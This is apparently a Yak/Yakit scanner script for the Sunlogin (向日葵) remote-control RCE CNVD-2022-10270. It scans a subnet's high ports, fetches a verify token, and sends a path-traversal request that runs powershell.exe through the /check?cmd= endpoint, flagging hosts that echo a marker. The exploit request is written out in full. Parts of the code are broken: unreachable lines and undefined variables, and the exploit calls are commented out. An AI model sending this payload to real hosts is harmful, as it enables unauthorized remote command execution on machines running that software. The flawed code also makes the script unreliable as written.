# input your yak code
log.setLevel("info")
yakit.AutoInitYakit()

targets := cli.String("target",cli.setDefault("192.168.252.0/24"))
ports := cli.String("ports",cli.setDefault("40000-50000"))
concurrent := cli.Int("concurrent",cli.setDefault(4000))


if targets == "" {
    die("empty target")
}


printf("start scan %v  ports:%v\n", targets, ports)

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0

`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    _, body = poc.Split([]byte(rsp))
    id = json.loads(body)["verify_string"]
    // println(id)
    return id
    if !str.MatchAllOfSubString(rsp, "HTTP/1.1 200") && !str.MatchAllOfRegexp(rsp, `enabled`){
        return
    }

}

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+jhssRx1 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: CID={{params(id)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr, "id":id}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAllOfRegexp(rsp, `jhssRx1`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v 向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞存在"),
            risk.type("RCE[向日葵远程控制软件]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞")
            }
       
    }

    return
}


ch, err = servicescan.Scan(targets, ports,servicescan.concurrent(concurrent),)
die(err)

ips = make([][]var,len(ch))

for result := range ch {
    if result.IsOpen() {
        println(result.Target,result.Port)
        // handleCheck1(result.Target,result.Port)
        // handleCheck(result.Target,result.Port)
        
    }
}






















